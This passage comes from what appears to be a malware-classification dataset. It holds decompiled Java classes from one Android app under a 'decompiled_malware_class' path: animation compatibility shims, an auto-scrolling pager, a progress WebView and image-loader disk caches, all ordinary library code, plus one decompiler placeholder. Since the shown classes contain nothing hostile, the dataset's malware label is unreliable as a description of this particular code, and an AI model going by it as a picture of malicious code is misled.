}         @Override public void onAnimationEnd(        View view2){           ViewCompat.setLayerType(view2,layerType,null);           ICSViewPropertyAnimatorCompatImpl.this.setListener(view2,null);         }         @Override public void onAnimationStart(        View view2){           ViewCompat.setLayerType(view2,2,null);         }       } );     }     @Override public void withStartAction(    View view,    final Runnable runnable){       setListener(view,new ViewPropertyAnimatorListener(){         @Override public void onAnimationCancel(        View view2){         }         @Override public void onAnimationEnd(        View view2){         }         @Override public void onAnimationStart(        View view2){           runnable.run();           ICSViewPropertyAnimatorCompatImpl.this.setListener(view2,null);         }       } );     }     @Override public void x(    View view,    float f){       ViewPropertyAnimatorCompatICS.x(view,f);     }     @Override public void xBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.xBy(view,f);     }     @Override public void y(    View view,    float f){       ViewPropertyAnimatorCompatICS.y(view,f);     }     @Override public void yBy(    View view,    float f){       ViewPropertyAnimatorCompatICS.yBy(view,f);     }   } class JBMr2ViewPropertyAnimatorCompatImpl extends JBViewPropertyAnimatorCompatImpl {     JBMr2ViewPropertyAnimatorCompatImpl(){     }     @Override public Interpolator getInterpolator(    View view){       return ViewPropertyAnimatorCompatJellybeanMr2.getInterpolator(view);     }   } class JBViewPropertyAnimatorCompatImpl extends ICSViewPropertyAnimatorCompatImpl {     JBViewPropertyAnimatorCompatImpl(){     }     @Override public void withEndAction(    View view,    Runnable runnable){       ViewPropertyAnimatorCompatJB.withEndAction(view,runnable);     }     @Override public void withLayer(    View view){       ViewPropertyAnimatorCompatJB.withLayer(view);     }     @Override public void withStartAction(    View view,    Runnable runnable){       ViewPropertyAnimatorCompatJB.withStartAction(view,runnable);     }   } interface ViewPropertyAnimatorCompatImpl {     void alpha(    View view,    float f);     void alphaBy(    View view,    float f);     void cancel(    View view);     long getDuration(    View view);     Interpolator getInterpolator(    View view);     long getStartDelay(    View view);     void rotation(    View view,    float f);     void rotationBy(    View view,    float f);     void rotationX(    View view,    float f);     void rotationXBy(    View view,    float f);     void rotationY(    View view,    float f);     void rotationYBy(    View view,    float f);     void scaleX(    View view,    float f);     void scaleXBy(    View view,    float f);     void scaleY(    View view,    float f);     void scaleYBy(    View view,    float f);     void setDuration(    View view,    long j);     void setInterpolator(    View view,    Interpolator interpolator);     void setListener(    View view,    ViewPropertyAnimatorListener viewPropertyAnimatorListener);     void setStartDelay(    View view,    long j);     void start(    View view);     void translationX(    View view,    float f);     void translationXBy(    View view,    float f);     void translationY(    View view,    float f);     void translationYBy(    View view,    float f);     void withEndAction(    View view,    Runnable runnable);     void withLayer(    View view);     void withStartAction(    View view,    Runnable runnable);     void x(    View view,    float f);     void xBy(    View view,    float f);     void y(    View view,    float f);     void yBy(    View view,    float f);   } static {     int i=Build.VERSION.SDK_INT;     if (i >= 18) {       IMPL=new JBMr2ViewPropertyAnimatorCompatImpl();       return;     }     if (i >= 16) {       IMPL=new JBViewPropertyAnimatorCompatImpl();     }  else     if (i >= 14) {       IMPL=new ICSViewPropertyAnimatorCompatImpl();     }  else {       IMPL=new BaseViewPropertyAnimatorCompatImpl();     }   }   public ViewPropertyAnimatorCompat(  View view){     this.mView=new WeakReference<>(view);   }   public ViewPropertyAnimatorCompat alpha(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.alpha(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat alphaBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.alphaBy(view,f);     }     return this;   }   public void cancel(){     View view=this.mView.get();     if (view != null) {       IMPL.cancel(view);     }   }   public long getDuration(){     View view=this.mView.get();     if (view != null) {       return IMPL.getDuration(view);     }     return 0L;   }   public Interpolator getInterpolator(){     View view=this.mView.get();     if (view != null) {       return IMPL.getInterpolator(view);     }     return null;   }   public long getStartDelay(){     View view=this.mView.get();     if (view != null) {       return IMPL.getStartDelay(view);     }     return 0L;   }   public ViewPropertyAnimatorCompat rotation(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.rotation(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat rotationBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.rotationBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat rotationX(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.rotationX(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat rotationXBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.rotationXBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat rotationY(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.rotationY(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat rotationYBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.rotationYBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat scaleX(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.scaleX(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat scaleXBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.scaleXBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat scaleY(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.scaleY(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat scaleYBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.scaleYBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat setDuration(  long j){     View view=this.mView.get();     if (view != null) {       IMPL.setDuration(view,j);     }     return this;   }   public ViewPropertyAnimatorCompat setInterpolator(  Interpolator interpolator){     View view=this.mView.get();     if (view != null) {       IMPL.setInterpolator(view,interpolator);     }     return this;   }   public ViewPropertyAnimatorCompat setListener(  ViewPropertyAnimatorListener viewPropertyAnimatorListener){     View view=this.mView.get();     if (view != null) {       IMPL.setListener(view,viewPropertyAnimatorListener);     }     return this;   }   public ViewPropertyAnimatorCompat setStartDelay(  long j){     View view=this.mView.get();     if (view != null) {       IMPL.setStartDelay(view,j);     }     return this;   }   public void start(){     View view=this.mView.get();     if (view != null) {       IMPL.start(view);     }   }   public ViewPropertyAnimatorCompat translationX(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.translationX(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat translationXBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.translationXBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat translationY(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.translationY(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat translationYBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.translationYBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat withEndAction(  Runnable runnable){     View view=this.mView.get();     if (view != null) {       IMPL.withEndAction(view,runnable);     }     return this;   }   public ViewPropertyAnimatorCompat withLayer(){     View view=this.mView.get();     if (view != null) {       IMPL.withLayer(view);     }     return this;   }   public ViewPropertyAnimatorCompat withStartAction(  Runnable runnable){     View view=this.mView.get();     if (view != null) {       IMPL.withStartAction(view,runnable);     }     return this;   }   public ViewPropertyAnimatorCompat x(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.x(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat xBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.xBy(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat y(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.y(view,f);     }     return this;   }   public ViewPropertyAnimatorCompat yBy(  float f){     View view=this.mView.get();     if (view != null) {       IMPL.yBy(view,f);     }     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPropertyAnimatorCompatICS.code","class ViewPropertyAnimatorCompatICS {   ViewPropertyAnimatorCompatICS(){   }   public static void alpha(  View view,  float f){     view.animate().alpha(f);   }   public static void alphaBy(  View view,  float f){     view.animate().alphaBy(f);   }   public static void cancel(  View view){     view.animate().cancel();   }   public static long getDuration(  View view){     return view.animate().getDuration();   }   public static long getStartDelay(  View view){     return view.animate().getStartDelay();   }   public static void rotation(  View view,  float f){     view.animate().rotation(f);   }   public static void rotationBy(  View view,  float f){     view.animate().rotationBy(f);   }   public static void rotationX(  View view,  float f){     view.animate().rotationX(f);   }   public static void rotationXBy(  View view,  float f){     view.animate().rotationXBy(f);   }   public static void rotationY(  View view,  float f){     view.animate().rotationY(f);   }   public static void rotationYBy(  View view,  float f){     view.animate().rotationYBy(f);   }   public static void scaleX(  View view,  float f){     view.animate().scaleX(f);   }   public static void scaleXBy(  View view,  float f){     view.animate().scaleXBy(f);   }   public static void scaleY(  View view,  float f){     view.animate().scaleY(f);   }   public static void scaleYBy(  View view,  float f){     view.animate().scaleYBy(f);   }   public static void setDuration(  View view,  long j){     view.animate().setDuration(j);   }   public static void setInterpolator(  View view,  Interpolator interpolator){     view.animate().setInterpolator(interpolator);   }   public static void setListener(  final View view,  final ViewPropertyAnimatorListener viewPropertyAnimatorListener){     view.animate().setListener(new AnimatorListenerAdapter(){       @Override public void onAnimationCancel(      Animator animator){         ViewPropertyAnimatorListener.this.onAnimationCancel(view);       }       @Override public void onAnimationEnd(      Animator animator){         ViewPropertyAnimatorListener.this.onAnimationEnd(view);       }       @Override public void onAnimationStart(      Animator animator){         ViewPropertyAnimatorListener.this.onAnimationStart(view);       }     } );   }   public static void setStartDelay(  View view,  long j){     view.animate().setStartDelay(j);   }   public static void start(  View view){     view.animate().start();   }   public static void translationX(  View view,  float f){     view.animate().translationX(f);   }   public static void translationXBy(  View view,  float f){     view.animate().translationXBy(f);   }   public static void translationY(  View view,  float f){     view.animate().translationY(f);   }   public static void translationYBy(  View view,  float f){     view.animate().translationYBy(f);   }   public static void x(  View view,  float f){     view.animate().x(f);   }   public static void xBy(  View view,  float f){     view.animate().xBy(f);   }   public static void y(  View view,  float f){     view.animate().y(f);   }   public static void yBy(  View view,  float f){     view.animate().yBy(f);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPropertyAnimatorCompatImpl.code","interface ViewPropertyAnimatorCompatImpl {   void alpha(  View view,  float f);   void alphaBy(  View view,  float f);   void cancel(  View view);   long getDuration(  View view);   Interpolator getInterpolator(  View view);   long getStartDelay(  View view);   void rotation(  View view,  float f);   void rotationBy(  View view,  float f);   void rotationX(  View view,  float f);   void rotationXBy(  View view,  float f);   void rotationY(  View view,  float f);   void rotationYBy(  View view,  float f);   void scaleX(  View view,  float f);   void scaleXBy(  View view,  float f);   void scaleY(  View view,  float f);   void scaleYBy(  View view,  float f);   void setDuration(  View view,  long j);   void setInterpolator(  View view,  Interpolator interpolator);   void setListener(  View view,  ViewPropertyAnimatorListener viewPropertyAnimatorListener);   void setStartDelay(  View view,  long j);   void start(  View view);   void translationX(  View view,  float f);   void translationXBy(  View view,  float f);   void translationY(  View view,  float f);   void translationYBy(  View view,  float f);   void withEndAction(  View view,  Runnable runnable);   void withLayer(  View view);   void withStartAction(  View view,  Runnable runnable);   void x(  View view,  float f);   void xBy(  View view,  float f);   void y(  View view,  float f);   void yBy(  View view,  float f); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPropertyAnimatorCompatJB.code","class ViewPropertyAnimatorCompatJB {   ViewPropertyAnimatorCompatJB(){   }   public static void withEndAction(  View view,  Runnable runnable){     view.animate().withEndAction(runnable);   }   public static void withLayer(  View view){     view.animate().withLayer();   }   public static void withStartAction(  View view,  Runnable runnable){     view.animate().withStartAction(runnable);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPropertyAnimatorCompatJellybeanMr2.code","class ViewPropertyAnimatorCompatJellybeanMr2 {   ViewPropertyAnimatorCompatJellybeanMr2(){   }   public static Interpolator getInterpolator(  View view){     return (Interpolator)view.animate().getInterpolator();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewPropertyAnimatorListener.code","public interface ViewPropertyAnimatorListener {   void onAnimationCancel(  View view);   void onAnimationEnd(  View view);   void onAnimationStart(  View view); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.widget\AutoScrollViewPager.code","public class AutoScrollViewPager extends ViewPager {   private long a;   private int b;   private boolean c;   private boolean d;   private int e;   private boolean f;   private Handler g;   private boolean h;   private boolean i;   private float j;   private float k;   private c l;   public AutoScrollViewPager(  Context context){     super(context);     this.a=3000L;     this.b=1;     this.c=true;     this.d=true;     this.e=0;     this.f=true;     this.h=false;     this.i=false;     this.j=0.0f;     this.k=0.0f;     this.l=null;     d();   }   public AutoScrollViewPager(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.a=3000L;     this.b=1;     this.c=true;     this.d=true;     this.e=0;     this.f=true;     this.h=false;     this.i=false;     this.j=0.0f;     this.k=0.0f;     this.l=null;     d();   }   public void a(  long j){     this.g.removeMessages(0);     this.g.sendEmptyMessageDelayed(0,j);   }   private void d(){     this.g=new b(this);     e();   }   private void e(){     try {       Field declaredField=ViewPager.class.getDeclaredField(""mScroller"");       declaredField.setAccessible(true);       Field declaredField2=ViewPager.class.getDeclaredField(""sInterpolator"");       declaredField2.setAccessible(true);       this.l=new c(getContext(),(Interpolator)declaredField2.get(null));       declaredField.set(this,this.l);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(){     this.h=true;     a(this.a);   }   public void a(  int i){     this.h=true;     a(i);   }   public void b(){     this.h=false;     this.g.removeMessages(0);   }   public void c(){     int count;     PagerAdapter adapter=getAdapter();     int currentItem=getCurrentItem();     if (adapter == null || (count=adapter.getCount()) <= 1) {       return;     }     int i=this.b == 0 ? currentItem - 1 : currentItem + 1;     if (i < 0) {       if (this.c) {         setCurrentItem(count - 1,this.f);       }     }  else     if (i != count) {       setCurrentItem(i,true);     }  else     if (this.c) {       setCurrentItem(0,this.f);     }   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     if (this.d) {       if (motionEvent.getAction() == 0 && this.h) {         this.i=true;         b();       }  else       if (motionEvent.getAction() == 1 && this.i) {         a();       }     }     if (this.e == 2 || this.e == 1) {       this.j=motionEvent.getX();       if (motionEvent.getAction() == 0) {         this.k=this.j;       }       int currentItem=getCurrentItem();       PagerAdapter adapter=getAdapter();       int count=adapter == null ? 0 : adapter.getCount();       if ((currentItem == 0 && this.k <= this.j) || (currentItem == count - 1 && this.k >= this.j)) {         if (this.e == 2) {           getParent().requestDisallowInterceptTouchEvent(false);         }  else {           if (count > 1) {             setCurrentItem((count - currentItem) - 1,this.f);           }           getParent().requestDisallowInterceptTouchEvent(true);         }         return super.onTouchEvent(motionEvent);       }     }     getParent().requestDisallowInterceptTouchEvent(true);     return super.onTouchEvent(motionEvent);   }   public void setBorderAnimation(  boolean z){     this.f=z;   }   public void setCycle(  boolean z){     this.c=z;   }   public void setDirection(  int i){     this.b=i;   }   public void setInterval(  long j){     this.a=j;   }   public void setScrollDurationFactor(  double d){     this.l.a(d);   }   public void setSlideBorderMode(  int i){     this.e=i;   }   public void setStopScrollWhenTouch(  boolean z){     this.d=z;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.widget\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@223bb872"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.widget\c.code","public class c extends Scroller {   private double a;   public c(  Context context,  Interpolator interpolator){     super(context,interpolator);     this.a=1.0d;   }   public void a(  double d){     this.a=d;   }   @Override public void startScroll(  int i,  int i2,  int i3,  int i4,  int i5){     super.startScroll(i,i2,i3,i4,(int)(i5 * this.a));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.widget\d.code","public class d extends WebChromeClient {   final ProgressWebView a;   public d(  ProgressWebView progressWebView){     this.a=progressWebView;   }   @Override public void onProgressChanged(  WebView webView,  int i){     ProgressBar progressBar;     ProgressBar progressBar2;     ProgressBar progressBar3;     ProgressBar progressBar4;     if (i == 100) {       progressBar4=this.a.a;       progressBar4.setVisibility(8);     }  else {       progressBar=this.a.a;       if (progressBar.getVisibility() == 8) {         progressBar3=this.a.a;         progressBar3.setVisibility(0);       }       progressBar2=this.a.a;       progressBar2.setProgress(i);     }     super.onProgressChanged(webView,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.widget\MyRelativeLayout.code","public class MyRelativeLayout extends RelativeLayout {   AutoScrollViewPager a;   public MyRelativeLayout(  Context context){     super(context);   }   public MyRelativeLayout(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);   }   public MyRelativeLayout(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);   }   @Override protected void onWindowVisibilityChanged(  int i){     super.onWindowVisibilityChanged(i);     if (i == 8) {       this.a.b();     }  else     if (i == 0) {       this.a.a();     }   }   public void setAutoScrollViewPager(  AutoScrollViewPager autoScrollViewPager){     this.a=autoScrollViewPager;   }   @Override public void setVisibility(  int i){     super.setVisibility(i);     if (i == 8 || i == 4) {       this.a.b();     }  else     if (i == 0) {       this.a.a();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.widget\ProgressWebView.code","public class ProgressWebView extends WebView {   private ProgressBar a;   public ProgressWebView(  Context context){     super(context);     a(context);   }   public ProgressWebView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     a(context);   }   private int a(  Context context,  float f){     return (int)((f / context.getResources().getDisplayMetrics().density) + 0.5f);   }   public void a(  Context context){     this.a=new ProgressBar(context,null,R.attr.progressBarStyleHorizontal);     this.a.setLayoutParams(new AbsoluteLayout.LayoutParams(-1,a(context,16.0f),0,0));     addView(this.a);     setWebChromeClient(new d(this));     WebSettings settings=getSettings();     settings.setDomStorageEnabled(true);     settings.setJavaScriptEnabled(true);     settings.setSupportZoom(false);     setScrollbarFadingEnabled(false);     setVerticalScrollBarEnabled(false);     setHorizontalScrollBarEnabled(false);   }   @Override protected void onScrollChanged(  int i,  int i2,  int i3,  int i4){     AbsoluteLayout.LayoutParams layoutParams=(AbsoluteLayout.LayoutParams)this.a.getLayoutParams();     layoutParams.x=i;     layoutParams.y=i2;     this.a.setLayoutParams(layoutParams);     super.onScrollChanged(i,i2,i3,i4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc\DiscCacheAware.code","@Deprecated public interface DiscCacheAware {   void clear();   void close();   File get(  String str);   File getDirectory();   boolean remove(  String str);   boolean save(  String str,  Bitmap bitmap) throws IOException ;   boolean save(  String str,  InputStream inputStream,  IoUtils.CopyListener copyListener) throws IOException ; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc\DiskCache.code","public interface DiskCache extends DiscCacheAware { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl\BaseDiscCache.code","public abstract class BaseDiscCache implements DiskCache {   public static final int DEFAULT_BUFFER_SIZE=32768;   public static final Bitmap.CompressFormat DEFAULT_COMPRESS_FORMAT=Bitmap.CompressFormat.PNG;   public static final int DEFAULT_COMPRESS_QUALITY=100;   private static final String ERROR_ARG_NULL="" argument must be not null"";   private static final String TEMP_IMAGE_POSTFIX="".tmp"";   protected int bufferSize;   protected final File cacheDir;   protected Bitmap.CompressFormat compressFormat;   protected int compressQuality;   protected final FileNameGenerator fileNameGenerator;   protected final File reserveCacheDir;   public BaseDiscCache(  File cacheDir){     this(cacheDir,null);   }   public BaseDiscCache(  File cacheDir,  File reserveCacheDir){     this(cacheDir,reserveCacheDir,DefaultConfigurationFactory.createFileNameGenerator());   }   public BaseDiscCache(  File cacheDir,  File reserveCacheDir,  FileNameGenerator fileNameGenerator){     this.bufferSize=32768;     this.compressFormat=DEFAULT_COMPRESS_FORMAT;     this.compressQuality=100;     if (cacheDir == null) {       throw new IllegalArgumentException(""cacheDir argument must be not null"");     }     if (fileNameGenerator == null) {       throw new IllegalArgumentException(""fileNameGenerator argument must be not null"");     }     this.cacheDir=cacheDir;     this.reserveCacheDir=reserveCacheDir;     this.fileNameGenerator=fileNameGenerator;   }   @Override public File getDirectory(){     return this.cacheDir;   }   @Override public File get(  String imageUri){     return getFile(imageUri);   }   @Override public boolean save(  String imageUri,  InputStream imageStream,  IoUtils.CopyListener listener) throws IOException {     File imageFile=getFile(imageUri);     File tmpFile=new File(imageFile.getAbsolutePath() + TEMP_IMAGE_POSTFIX);     boolean loaded=false;     try {       OutputStream os=new BufferedOutputStream(new FileOutputStream(tmpFile),this.bufferSize);       try {         loaded=IoUtils.copyStream(imageStream,os,listener,this.bufferSize);         return loaded;       }   finally {         IoUtils.closeSilently(os);       }     }   finally {       IoUtils.closeSilently(imageStream);       if (loaded && !tmpFile.renameTo(imageFile)) {         loaded=false;       }       if (!loaded) {         tmpFile.delete();       }     }   }   @Override public boolean save(  String imageUri,  Bitmap bitmap) throws IOException {     File imageFile=getFile(imageUri);     File tmpFile=new File(imageFile.getAbsolutePath() + TEMP_IMAGE_POSTFIX);     OutputStream os=new BufferedOutputStream(new FileOutputStream(tmpFile),this.bufferSize);     boolean savedSuccessfully=false;     try {       savedSuccessfully=bitmap.compress(this.compressFormat,this.compressQuality,os);       bitmap.recycle();       return savedSuccessfully;     }   finally {       IoUtils.closeSilently(os);       if (0 != 0 && !tmpFile.renameTo(imageFile)) {         savedSuccessfully=false;       }       if (!savedSuccessfully) {         tmpFile.delete();       }     }   }   @Override public boolean remove(  String imageUri){     return getFile(imageUri).delete();   }   @Override public void close(){   }   @Override public void clear(){     File[] files=this.cacheDir.listFiles();     if (files != null) {       for (      File f : files) {         f.delete();       }     }   }   public File getFile(  String imageUri){     String fileName=this.fileNameGenerator.generate(imageUri);     File dir=this.cacheDir;     if (!this.cacheDir.exists() && !this.cacheDir.mkdirs() && this.reserveCacheDir != null && (this.reserveCacheDir.exists() || this.reserveCacheDir.mkdirs())) {       dir=this.reserveCacheDir;     }     return new File(dir,fileName);   }   public void setBufferSize(  int bufferSize){     this.bufferSize=bufferSize;   }   public void setCompressFormat(  Bitmap.CompressFormat compressFormat){     this.compressFormat=compressFormat;   }   public void setCompressQuality(  int compressQuality){     this.compressQuality=compressQuality;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl\LimitedAgeDiscCache.code","public class LimitedAgeDiscCache extends BaseDiscCache {   private final Map<File,Long> loadingDates;   private final long maxFileAge;   public LimitedAgeDiscCache(  File cacheDir,  long maxAge){     this(cacheDir,null,DefaultConfigurationFactory.createFileNameGenerator(),maxAge);   }   public LimitedAgeDiscCache(  File cacheDir,  File reserveCacheDir,  long maxAge){     this(cacheDir,reserveCacheDir,DefaultConfigurationFactory.createFileNameGenerator(),maxAge);   }   public LimitedAgeDiscCache(  File cacheDir,  File reserveCacheDir,  FileNameGenerator fileNameGenerator,  long maxAge){     super(cacheDir,reserveCacheDir,fileNameGenerator);     this.loadingDates=Collections.synchronizedMap(new HashMap());     this.maxFileAge=1000 * maxAge;   }   @Override public File get(  String imageUri){     boolean cached;     File file=super.get(imageUri);     if (file != null && file.exists()) {       Long loadingDate=this.loadingDates.get(file);       if (loadingDate == null) {         cached=false;         loadingDate=Long.valueOf(file.lastModified());       }  else {         cached=true;       }       if (System.currentTimeMillis() - loadingDate.longValue() > this.maxFileAge) {         file.delete();         this.loadingDates.remove(file);       }  else       if (!cached) {         this.loadingDates.put(file,loadingDate);       }     }     return file;   }   @Override public boolean save(  String imageUri,  InputStream imageStream,  IoUtils.CopyListener listener) throws IOException {     boolean saved=super.save(imageUri,imageStream,listener);     rememberUsage(imageUri);     return saved;   }   @Override public boolean save(  String imageUri,  Bitmap bitmap) throws IOException {     boolean saved=super.save(imageUri,bitmap);     rememberUsage(imageUri);     return saved;   }   @Override public boolean remove(  String imageUri){     this.loadingDates.remove(getFile(imageUri));     return super.remove(imageUri);   }   @Override public void clear(){     super.clear();     this.loadingDates.clear();   }   private void rememberUsage(  String imageUri){     File file=getFile(imageUri);     long currentTime=System.currentTimeMillis();     file.setLastModified(currentTime);     this.loadingDates.put(file,Long.valueOf(currentTime));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl\UnlimitedDiscCache.code","public class UnlimitedDiscCache extends BaseDiscCache {   public UnlimitedDiscCache(  File cacheDir){     super(cacheDir);   }   public UnlimitedDiscCache(  File cacheDir,  File reserveCacheDir){     super(cacheDir,reserveCacheDir);   }   public UnlimitedDiscCache(  File cacheDir,  File reserveCacheDir,  FileNameGenerator fileNameGenerator){     super(cacheDir,reserveCacheDir,fileNameGenerator);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\DiskLruCache.code","public final class DiskLruCache implements Closeable {   static final long ANY_SEQUENCE_NUMBER=-1;   private static final String CLEAN=""CLEAN"";   private static final String DIRTY=""DIRTY"";   static final String JOURNAL_FILE=""journal"";   static final String JOURNAL_FILE_BACKUP=""journal.bkp"";   static final String JOURNAL_FILE_TEMP=""journal.tmp"";   static final String MAGIC=""libcore.io.DiskLruCache"";   private static final String READ=""READ"";   private static final String REMOVE=""REMOVE"";   static final String VERSION_1=""1"";   private final int appVersion;   private final File directory;   private final File journalFile;   private final File journalFileBackup;   private final File journalFileTmp;   private Writer journalWriter;   private int maxFileCount;   private long maxSize;   private int redundantOpCount;   private final int valueCount;   static final Pattern LEGAL_KEY_PATTERN=Pattern.compile(""[a-z0-9_-]{1,64}"");   private static final OutputStream NULL_OUTPUT_STREAM=new OutputStream(){     @Override public void write(    int b) throws IOException {     }   } ;   private long size=0;   private int fileCount=0;   private final LinkedHashMap<String,Entry> lruEntries=new LinkedHashMap<>(0,0.75f,true);   private long nextSequenceNumber=0;   final ThreadPoolExecutor executorService=new ThreadPoolExecutor(0,1,60,TimeUnit.SECONDS,new LinkedBlockingQueue());   private final Callable<Void> cleanupCallable=new Callable<Void>(){     @Override public Void call() throws Exception { synchronized (DiskLruCache.this) {         if (DiskLruCache.this.journalWriter != null) {           DiskLruCache.this.trimToSize();           DiskLruCache.this.trimToFileCount();           if (DiskLruCache.this.journalRebuildRequired()) {             DiskLruCache.this.rebuildJournal();             DiskLruCache.this.redundantOpCount=0;           }         }       }       return null;     }   } ;   private DiskLruCache(  File directory,  int appVersion,  int valueCount,  long maxSize,  int maxFileCount){     this.directory=directory;     this.appVersion=appVersion;     this.journalFile=new File(directory,JOURNAL_FILE);     this.journalFileTmp=new File(directory,JOURNAL_FILE_TEMP);     this.journalFileBackup=new File(directory,JOURNAL_FILE_BACKUP);     this.valueCount=valueCount;     this.maxSize=maxSize;     this.maxFileCount=maxFileCount;   }   public static DiskLruCache open(  File directory,  int appVersion,  int valueCount,  long maxSize,  int maxFileCount) throws IOException {     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     if (maxFileCount <= 0) {       throw new IllegalArgumentException(""maxFileCount <= 0"");     }     if (valueCount <= 0) {       throw new IllegalArgumentException(""valueCount <= 0"");     }     File backupFile=new File(directory,JOURNAL_FILE_BACKUP);     if (backupFile.exists()) {       File journalFile=new File(directory,JOURNAL_FILE);       if (journalFile.exists()) {         backupFile.delete();       }  else {         renameTo(backupFile,journalFile,false);       }     }     DiskLruCache cache=new DiskLruCache(directory,appVersion,valueCount,maxSize,maxFileCount);     if (cache.journalFile.exists()) {       try {         cache.readJournal();         cache.processJournal();         cache.journalWriter=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(cache.journalFile,true),Util.US_ASCII));         return cache;       }  catch (      IOException journalIsCorrupt) {         System.out.println(""DiskLruCache "" + directory + "" is corrupt: ""+ journalIsCorrupt.getMessage()+ "", removing"");         cache.delete();       }     }     directory.mkdirs();     DiskLruCache cache2=new DiskLruCache(directory,appVersion,valueCount,maxSize,maxFileCount);     cache2.rebuildJournal();     return cache2;   }   private void readJournal() throws IOException {     StrictLineReader reader=new StrictLineReader(new FileInputStream(this.journalFile),Util.US_ASCII);     try {       String magic=reader.readLine();       String version=reader.readLine();       String appVersionString=reader.readLine();       String valueCountString=reader.readLine();       String blank=reader.readLine();       if (!MAGIC.equals(magic) || !VERSION_1.equals(version) || !Integer.toString(this.appVersion).equals(appVersionString)|| !Integer.toString(this.valueCount).equals(valueCountString)|| !"""".equals(blank)) {         throw new IOException(""unexpected journal header: ["" + magic + "", ""+ version+ "", ""+ valueCountString+ "", ""+ blank+ ""]"");       }       int lineCount=0;       while (true) {         try {           readJournalLine(reader.readLine());           lineCount++;         }  catch (        EOFException e) {           this.redundantOpCount=lineCount - this.lruEntries.size();           Util.closeQuietly(reader);   